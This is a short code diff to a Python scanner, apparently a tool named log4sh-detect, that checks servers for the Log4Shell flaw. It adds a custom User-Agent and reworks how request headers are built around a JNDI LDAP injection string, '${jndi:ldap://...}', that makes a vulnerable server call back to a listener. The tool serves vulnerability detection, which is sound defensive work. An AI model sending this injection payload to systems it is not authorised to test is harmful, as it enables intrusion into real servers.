@@ -71,6 +71,8 @@ AUTHOR                  = "Morty (Morty's Creations)"
 # GLOBALS / CONSTANTS
 #------------------------------------------------------------------------------
 #------------------------------------------------------------------------------
+USER_AGENT              = ("MortysCreations_log4sh-detect/%s" % (VERSION))
+#------------------------------------------------------------------------------
 RETVAL_NOT_VULNERABLE   = 0
 RETVAL_VULNERABLE       = 1
 RETVAL_NO_TEST          = 2
@@ -736,15 +738,15 @@ def sendExploitedRequest(
     "error"         : "",
     }
   
+  headers           = {
+                    "User-Agent"        : USER_AGENT,
+                    }
+  
   if(not(noExploit)):
-    headers     = {
-                exploitHeaderName: ("${jndi:ldap://%s:%d/%s}" % (
+    headers[exploitHeaderName]      = ("${jndi:ldap://%s:%d/%s}" % (
                     exploitCBIP,
                     exploitCBPort,
                     exploitCBUserData))
-                }
-  else:
-    headers    = {}
   
   if("://" in url):
     (p, u) = url.split("://")
